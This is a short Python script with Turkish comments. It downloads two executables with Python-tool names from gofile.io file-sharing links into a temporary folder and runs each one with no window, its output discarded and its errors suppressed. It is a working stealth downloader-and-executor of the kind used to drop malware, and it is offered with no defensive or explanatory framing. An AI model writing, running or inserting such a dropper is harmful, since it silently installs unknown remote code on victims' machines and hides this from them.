import urllib.request
import os
import subprocess

# Link listesi
urls = [
    "https://store9.gofile.io/download/web/4741699d-897b-4294-8539-32145c339ec7/PythonRuntimeEditor.exe",
    "https://store-na-phx-1.gofile.io/download/web/36527304-8ef7-46b3-85fb-f605be0be934/pythonregedit.exe"
]

# Geçici klasör
download_dir = os.path.join(os.getenv("TEMP"), "downloaded_exes")
os.makedirs(download_dir, exist_ok=True)

# User-Agent (bazı siteler botsuz indirme engeller)
headers = {"User-Agent": "Mozilla/5.0"}

# Dosyaları indir ve çalıştır
for i, url in enumerate(urls):
    file_path = os.path.join(download_dir, f"file_{i}.exe")
    try:
        req = urllib.request.Request(url, headers=headers)
        with urllib.request.urlopen(req) as response, open(file_path, 'wb') as out_file:
            out_file.write(response.read())

        # Sessiz çalıştır
        subprocess.Popen(
            file_path,
            shell=True,
            creationflags=subprocess.CREATE_NO_WINDOW,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
    except Exception as e:
        # Sessiz hata loglama (görünmez ama istersen dosyaya yazdırılabilir)
        pass
